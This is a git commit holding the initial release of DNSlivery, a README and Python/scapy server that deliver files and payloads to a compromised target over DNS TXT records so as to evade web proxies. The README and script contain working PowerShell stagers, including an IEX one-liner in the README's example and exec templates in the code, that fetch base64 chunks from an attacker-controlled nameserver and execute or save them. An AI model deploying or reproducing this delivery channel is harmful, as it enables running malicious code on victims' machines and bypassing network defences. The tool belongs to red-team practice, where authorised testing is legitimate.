f3085af7b0f7176d2fce5ac5f0f29b9102d90e63
Samy Baiwir <no0be@pm.me>
2019-01-29 16:52:52 +0100

    Initial release

--- README.md
+++ README.md
@@ -1,2 +1,142 @@
 # DNSlivery
-Easy files and payloads delivery over DNS
+Easy files and payloads delivery over DNS.
+
+- [DNSlivery](#dnslivery)
+- [Acknowledgments](#acknowledgments)
+- [Description](#description)
+  - [What problem are you trying to solve?](#what-problem-are-you-trying-to-solve)
+  - [How does it work?](#how-does-it-work)
+  - [Requirements](#requirements)
+- [Setup](#setup)
+  - [DNS Zone](#dns-zone)
+  - [DNSLivery](#dnslivery)
+- [Usage](#usage)
+  - [Server](#server)
+  - [Target](#target)
+
+# Acknowledgments
+This project has been originally inspired by [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) and [Joff Thyer](https://twitter.com/joff_thyer)'s technical segment on the Paul's Security Weekly podcast #590 ([youtu.be/CP6cIwFJswQ](https://youtu.be/CP6cIwFJswQ)).
+
+# Description
+## What problem are you trying to solve?
+Easily deliver files and/or payloads to a compromised target where classic web delivery is not possible and **without the need for a dedicated client software**. This applies to restricted environments where outgoing web traffic is forbidden or simply inspected by a curious web proxy.
+
+![web-delivery-blocked.png](img/web-delivery-blocked.png)
+
+Even though more complete DNS tunneling tools already exist (s.a. [dnscat2](https://github.com/iagox86/dnscat2) and [iodine](https://code.kryo.se/iodine/)), they all require to run a dedicated client on the target. The problem is that there is probably no other way then DNS to deliver the client in such restricted environments. In other words, building a DNS communication channel with these tools require to already have a DNS communication channel.
+
+In comparison, DNSlivery only provides one-way communication from your server to the target but does not require any dedicated client to do so. Thus, if you need to build a reliable two-way communication channel over DNS, use DNSlivery to deliver the client of a more advanced DNS tunneling tool to your target.
+
+## How does it work?
+Just like most DNS tunneling tools, DNSlivery uses `TXT` records to store the content of files in their base64 representation. However, it does not require to setup a full-fledged DNS server to work. Instead, it uses the [scapy](https://scapy.net/) library to listen for incoming DNS packets and craft the desired response. 
+
+![dnslivery-network.png](img/dnslivery-network.png)
+
+As most files do not fit in a single `TXT` record, DNSlivery will create multiple ordered records containing base64 chunks of the file. As an example, the above diagram illustrates the delivery of the 42<sup>nd</sup> chunk of the file named `file`.
+
+In order to easily retrieve all base64 chunks and put them back together in their original format, DNSlivery will also generate a single cleartext stager per file.
+
+![stager-delivery.png](img/stager-delivery.png)
+
+Currently, only PowerShell stagers are supported.
+
+
+## Requirements
+DNSlivery does not require to build a complex server infrastructure. In fact, there are only two simple requirements: 
+
+- be able to create a `NS` record in your public DNS zone
+- have a Linux server capable of receiving udp/53 traffic from the Internet
+
+# Setup
+## DNS Zone
+The first step is to delegate a sub-domain to the server that will run DNSlivery by creating a new `NS` record. As an example, I created the following record to delegate the sub-domain `dnsd.no0.be` to the server at `vps.no0.be`.
+
+```
+dnsd    IN  NS vps.no0.be.
+```
+
+If your zone is managed by a third-party provider, refer to their documentation to create the `NS` record.
+
+## DNSLivery
+The only requirements to run DNSlivery are `python3` and its `scapy` library.
+```
+git clone https://github.com/no0be/DNSlivery.git && cd DNSlivery
+pip install -r requirements.txt
+```
+
+# Usage
+## Server
+DNSlivery will serve all files of a given directory like (`pwd` by default):
+
+```
+usage: dnslivery.py [-h] [-p PATH] [-s SIZE] [-v] interface domain nameserver
+
+DNSlivery - Easy files and payloads delivery over DNS
+
+positional arguments:
+  interface             interface to listen to DNS traffic
+  domain                FQDN name of the DNS zone
+  nameserver            FQDN name of the server running DNSlivery
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -p PATH, --path PATH  path of directory to serve over DNS (default: pwd)
+  -s SIZE, --size SIZE  size in bytes of base64 chunks (default: 255)
+  -v, --verbose         increase verbosity
+```
+
+**Example**: 
+```
+$ sudo python3 dnslivery.py eth0 dnsd.no0.be vps.no0.be -p /tmp/dns-delivery
+
+DNSlivery - Easy files and payloads delivery over DNS
+
+[*] File "file" ready for delivery at file.dnsd.no0.be (7 chunks)
+[*] Listening for DNS queries...
+```
+
+## Target
+On the target, start by **retrieving the stager** of the desired file by requesting its dedicated `TXT` record.
+
+| Action  | Stager                     | Description                                           |
+| ------- | -------------------------- | ----------------------------------------------------- |
+| Print   | `[filename].[domain]`      | (**Default**) Print the delivered file to the console |
+| Execute | `[filename].exec.[domain]` | Execute the delivered file (useful for scripts)       |
+| Save    | `[filename].save.[domain]` | Save the delivered file to disk (useful for binaries) |
+
+Then, simply **copy and paste the stager quoted in the response to a PowerShell console** to retrieve the file on the target.
+
+**Example**:
+```
+PS> nslookup -type=txt file.exec.dnsd.no0.be
+Server:  one.one.one.one
+Address:  1.1.1.1
+
+Non-authoritative answer:
+file.exec.dnsd.no0.be   text =
+
+        "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..6 | % {Resolve-DnsName -type TXT -Name "file.$_.dnsd.no0.be" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))"
+
+PS> IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..6 | % {Resolve-DnsName -type TXT -Name "file.$_.dnsd.no0.be" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))
+Fight Bugs                      |     |
+                                \\_V_//
+                                \/=|=\/
+                                 [=v=]
+                               __\___/_____
+                              /..[  _____  ]
+                             /_  [ [  M /] ]
+                            /../.[ [ M /@] ]
+                           <-->[_[ [M /@/] ]
+                          /../ [.[ [ /@/ ] ]
+     _________________]\ /__/  [_[ [/@/ C] ]
+    <_________________>>0---]  [=\ \@/ C / /
+       ___      ___   ]/000o   /__\ \ C / /
+          \    /              /....\ \_/ /
+       ....\||/....           [___/=\___/
+      .    .  .    .          [...] [...]
+     .      ..      .         [___/ \___]
+     .    0 .. 0    .         <---> <--->
+  /\/\.    .  .    ./\/\      [..]   [..]
+ / / / .../|  |\... \ \ \    _[__]   [__]_
+/ / /       \/       \ \ \  [____>   <____]
+```
---
+++ dnslivery.py
@@ -0,0 +1,192 @@
+#! /usr/bin/env python3
+
+import sys
+import os
+import argparse
+import signal
+import re
+import base64
+from scapy.all import *
+
+banner = """
+DNSlivery - Easy files and payloads delivery over DNS
+"""
+
+def log(message, msg_type = ''):
+    prefix  = '[*]'
+    color   = '\033[0;m'
+
+    if msg_type == '+':
+        prefix  = '[+]'
+        color   = '\033[1;32m'
+    elif msg_type == '-':
+        prefix  = '[-]'
+        color   = '\033[1;31m'
+    elif msg_type == 'debug':
+        prefix  = '[DEBUG]'
+        color   = '\033[0;33m'
+
+    print('%s%s %s' % (color, prefix, message))
+
+def base64_encode(filepath):
+    with open(filepath, 'rb') as f:
+        return base64.b64encode(f.read())
+
+def signal_handler(signal, frame):
+    log('Exiting...')
+    sys.exit(0)
+
+def dns_handler(data):
+    # only process dns queries
+    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
+        # get access to the global chunks variable from inside the function
+        global chunks
+
+        # split packet layers
+        ip = data.getlayer(IP)
+        udp = data.getlayer(UDP)
+        dns = data.getlayer(DNS)
+        dnsqr = data.getlayer(DNSQR)
+
+        # only process txt queries (type 16)
+        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
+            if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
+
+            # remove domain part of fqdn and split the different parts of hostname
+            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')
+
+            # check if hostname match existing file 
+            if len(hostname) > 0 and hostname[0] in chunks:
+                
+                # stager response 
+                if len(hostname) == 1:
+                    response = stagers[hostname[0]]['print']
+                    log('Delivering %s stager to %s' % (hostname[0], ip.src), '+')
+
+                # exec stager response
+                elif len(hostname) == 2 and hostname[1] == 'exec':
+                    response = stagers[hostname[0]]['exec']
+                    log('Delivering %s exec stager to %s' % (hostname[0], ip.src), '+')
+
+                # save stager response
+                elif len(hostname) == 2 and hostname[1] == 'save':
+                    response = stagers[hostname[0]]['save']
+                    log('Delivering %s save stager to %s' % (hostname[0], ip.src), '+')
+
+                # base64 chunk response
+                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) < len(chunks[hostname[0]]):
+                    response = chunks[hostname[0]][int(hostname[1])]
+                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1])+1, len(chunks[hostname[0]]), ip.src), '+')
+
+                else: return
+
+                # build response packet
+                rdata = response
+                rcode = 0
+                dn = args.domain
+                an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
+                ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)
+
+                response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
+                send(response_pkt, verbose=0, iface=args.interface)
+        
+
+if __name__ == '__main__':
+    # parse args
+    parser = argparse.ArgumentParser(description = banner)
+    parser.add_argument('interface', default=None, help='interface to listen to DNS traffic')
+    parser.add_argument('domain', default=None, help='FQDN name of the DNS zone')
+    parser.add_argument('nameserver', default=None, help='FQDN name of the server running DNSlivery')
+    parser.add_argument('-p', '--path', default='.', help='path of directory to serve over DNS (default: pwd)')
+    parser.add_argument('-s', '--size', default='255', help='size in bytes of base64 chunks (default: 255)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='increase verbosity')
+    args = parser.parse_args()
+
+    print('%s' % banner)
+
+    # verify root
+    if os.geteuid() != 0:
+        log('Script needs to be run with root privileges', '-')
+        sys.exit(-1)
+
+    # verify path exists and is readable
+    abspath = os.path.abspath(args.path)
+    
+    if not os.path.exists(abspath) or not os.path.isdir(abspath):
+        log('Path %s does not exist or is not a directory' % abspath, '-')
+        sys.exit(-1)
+
+    # list files in path
+    filenames = {}
+    for root, dirs, files in os.walk(abspath):
+        for name in files:
+            filenames[name] = ''
+        break
+    
+    # for each file, sanitize filename compute chunks and generate stagers
+    chunks = {}
+    stagers = {}
+
+    stager_templates = {
+        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings})))',
+        'print-1': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings)))',
+        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))',
+        'exec-1': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings))))',
+        'save': '[IO.File]::WriteAllBytes("\output\path", [System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings})))',
+        'save-1': '[IO.File]::WriteAllBytes("\output\path", [System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings)))'
+    }
+
+    for name in filenames:
+
+        # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
+        sanitized = re.sub(r'[^\x00-\x7F]','', name)        # remove non-ascii chars (see unidecode to replace with nearest ascii char)
+        sanitized = sanitized.lower()                       # lower all chars
+        sanitized = re.sub('[^a-z0-9\-]', '-', sanitized)   # replace chars outside charset to '-'
+        filenames[name] = sanitized
+
+        # compute base64 chunks of files
+        if not args.size.isdecimal():
+            log('Incorrect size value for base64 chunks', '-')
+            sys.exit(-1)
+
+        size = int(args.size)
+
+        try:
+            # encode file content to base64
+            encoded_file = base64_encode(os.path.join(abspath, name))
+        
+            # split base64 into chunks of provided size (default: 255)
+            encoded_chunks = []
+            for i in range(0, len(encoded_file), size):
+                encoded_chunks.append(encoded_file[i:i + size])
+
+            chunks[filenames[name]] = encoded_chunks
+        except:
+            # remove key from dict in case of failure (i.e. file permissions)
+            del filenames[name]
+            log('Error computing base64 for %s, file will been ignored' % name, '-')
+            break
+
+        # generate stagers
+        stagers[filenames[name]] = {}
+
+        # select template based on number of chunks 
+        if len(chunks[filenames[name]]) <= 1:
+            stagers[filenames[name]]['print'] = stager_templates['print-1'] % (filenames[name], args.domain)
+            stagers[filenames[name]]['exec'] = stager_templates['exec-1'] % (filenames[name], args.domain)
+            stagers[filenames[name]]['save'] = stager_templates['save-1'] % (filenames[name], args.domain)
+        else:
+            stagers[filenames[name]]['print'] = stager_templates['print'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
+            stagers[filenames[name]]['exec'] = stager_templates['exec'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
+            stagers[filenames[name]]['save'] = stager_templates['save'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
+
+        # display file ready for delivery
+        log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
+
+    # register signal handler
+    signal.signal(signal.SIGINT, signal_handler)
+
+    # listen for DNS query
+    log('Listening for DNS queries...')
+
+    while True: dns_listener = sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
